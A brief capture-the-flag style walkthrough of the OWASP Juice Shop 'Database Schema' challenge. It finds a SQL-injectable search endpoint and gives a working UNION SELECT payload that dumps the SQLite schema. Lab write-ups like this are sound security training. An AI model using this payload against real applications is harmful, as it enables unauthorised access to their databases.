# Database Schema

`https://pwning.owasp-juice.shop/companion-guide/latest/part1/running.html`

There's a search endpoint that's vulnerable to SQLi.

![alt text](assets/databaseschema1.png)

![alt text](assets/databaseschema2.png)

We can try a UNION attack to extract database schema information.

![alt text](assets/databaseschema3.png)

![alt text](assets/databaseschema4.png)

We can craft a UNION SELECT payload to extract the database schema by querying the `sqlite_master` table.

```sql
apple'))+UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master+--
```

![alt text](assets/databaseschema5.png)

![alt text](assets/databaseschema6.png)